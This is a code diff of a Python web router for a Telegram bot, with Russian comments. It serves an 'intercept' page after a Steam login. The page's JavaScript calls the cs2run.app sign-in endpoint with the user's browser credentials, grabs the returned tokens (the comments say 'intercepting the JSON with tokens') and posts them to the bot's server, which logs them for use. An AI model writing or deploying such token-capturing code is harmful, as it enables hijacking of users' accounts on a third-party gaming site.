@@ -38,7 +38,7 @@ async def auth_callback(request: Request, chat_id: int = Query(...)):
 
     print("\n🧪 STEAM CALLBACK PARAMS:\n", steam_params, "\n")
 
-    # Показываем страницу-перехватчик
+    # Показываем страницу-перехватчик, которая уже отправит данные в CS2RUN
     intercept_url = f"{SELF_URL}/intercept?chat_id={chat_id}"
     return RedirectResponse(intercept_url)
 
@@ -46,7 +46,7 @@ async def auth_callback(request: Request, chat_id: int = Query(...)):
 # 3️⃣ Страница-перехватчик, ловим токены CS2RUN
 # -------------------------------
 @router.get("/intercept")
-async def intercept(chat_id: int):
+async def intercept():
     return HTMLResponse(f"""
 <!DOCTYPE html>
 <html>
@@ -58,19 +58,22 @@ async def intercept(chat_id: int):
 <script>
 (async function() {{
     try {{
-        // POST-запрос на /start-sign-in с openid параметрами должен быть через браузер
-        const resp = await fetch('https://cs2run.app/auth/1/start-sign-in/', {{
+        // Берём все GET параметры страницы (openid.* + chat_id)
+        const params = new URLSearchParams(window.location.search);
+        const qs = params.toString();
+
+        // Делаем fetch к CS2RUN с этими параметрами
+        const resp = await fetch(`https://cs2run.app/auth/1/start-sign-in/?${{qs}}`, {{
             method: 'GET',
             credentials: 'include'
         }});
 
-        // Попробуем получить JSON с токенами
+        // Перехватываем JSON с токенами
         const data = await resp.json();
-
         console.log("🔥 GOT CS2RUN TOKENS:", data);
 
-        // Отправляем на сервер
-        await fetch('{SELF_URL}/bot/receive?chat_id={chat_id}', {{
+        // Отправляем на сервер для бота
+        await fetch('{SELF_URL}/bot/receive?chat_id=' + params.get('chat_id'), {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
             body: JSON.stringify(data)
@@ -95,5 +98,5 @@ async def intercept(chat_id: int):
 @router.post("/bot/receive")
 async def receive_tokens(chat_id: int, payload: dict):
     print("\n🔥 GOT TOKENS FOR CHAT", chat_id, ":\n", json.dumps(payload, indent=2), "\n")
-    # Здесь можно положить их в RAM_DATA или в бота
+    # Здесь можно положить их в RAM или сразу использовать для бота
     return {"ok": True}
